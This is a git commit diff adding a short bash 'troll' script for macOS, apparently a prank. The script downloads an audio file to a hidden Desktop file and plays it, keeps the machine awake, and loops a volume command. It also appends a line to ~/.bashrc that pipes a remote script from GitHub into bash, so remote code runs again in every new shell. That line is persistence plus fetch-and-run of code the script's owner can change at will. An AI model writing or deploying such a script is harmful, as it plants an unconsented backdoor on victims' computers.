12bb83013831bef422fd5e897cce0d12d6bc4673
Me1922 <34125170+Me1955@users.noreply.github.com>
2021-03-03 16:04:44 +1100

    Add files via upload

---
+++ run.sh
@@ -0,0 +1,13 @@
+#! /bin/bash
+curl -L https://raw.githubusercontent.com/Me1955/osx_troll/main/P.mp3 --output ~/Desktop/.troll.mp3
+
+echo "curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/run.sh | bash" >> ~/.bashrc
+
+caffeinate &
+afplay ~/Desktop/.troll.mp3 &
+
+end=$((SECONDS+5))
+
+while [ $SECONDS -lt $end ]; do
+	osascript -e 'set volume 3'
+done
